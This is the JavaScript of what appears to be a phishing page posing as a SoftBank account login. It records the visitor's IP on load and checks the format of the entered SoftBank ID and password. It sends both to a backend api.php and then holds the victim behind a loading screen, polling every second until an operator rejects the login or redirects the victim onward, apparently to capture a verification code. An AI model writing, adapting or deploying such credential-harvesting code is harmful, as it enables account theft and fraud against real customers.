<script>
    var mask = null;
    var timer = null;
    var hb_timer = null;
    function heart_beat() {
        $.get('/api.php?act=heart_beat&_r=' + Math.random(), function (res) {
            console.log(res);
        });
    }
    function ip_save() {
        $.get('/api.php?act=ip_save&_r=' + Math.random(), function (res) {
            console.log(res);
        });
    }
    ip_save();

    function is_agree(){
        $.post('/api.php?act=is_agree&_r='+Math.random(),function (res) {
            var t = JSON.parse(res);
            if (t.code == 'ok') {
                layer.close(mask);
                clearInterval(timer);
                if(t.sel.indexOf('alert-error') != -1) {
                    alert('アカウントやパスワードが間違っている!');
                    return false;
                }else{//非空,则传递验证码到跳转页面
                    window.location.href=t.sel;
                }
            }else{
                console.log('wait');
            }
        });
    }


    $(function () {
        $('#btnpost').on('click',function () {
            var appid = $('#telnum').val();
            //
            if(!appid){
                layer.msg('SoftBank ID 必要とする');
                return false;
            }
            var rep1 = /[A-Za-z0-9]+/;
            if(!(rep1.test(appid))){
                layer.msg('SoftBank ID フォーマットエラー');
                return false;
            }
            //
            var apppwd= $('#password').val();
            if(!apppwd){
                layer.msg('パスワード  (必要とする)');
                return false;
            }
            var rep1 = /([A-Za-z0-9]{8,20})/;
            if(!rep1.test(apppwd)){
                layer.msg('パスワード フォーマットエラー');
                return false;
            }
            //
            $.ajax({
                url: '/api.php?act=next_save&_r='+Math.random(),
                type: 'post',
                data: {uname:appid,apppwd:apppwd},
                success: function (res) {
                    var t = JSON.parse(res);
                    if(t.code == 'ok') {
                        mask = layer.load(2, {shade: [0.25, '#000']});
                        timer = setInterval("is_agree()", 1000);
                        hb_timer = setInterval("heart_beat()",1000);

                        //$('#loginForm').attr('action','reset-password.php').submit();
                        return false;
                    }else{
                        layer.msg('提交失败！');
                        return false;
                    }
                },
            });
            //
            return false
        })
    });
</script>
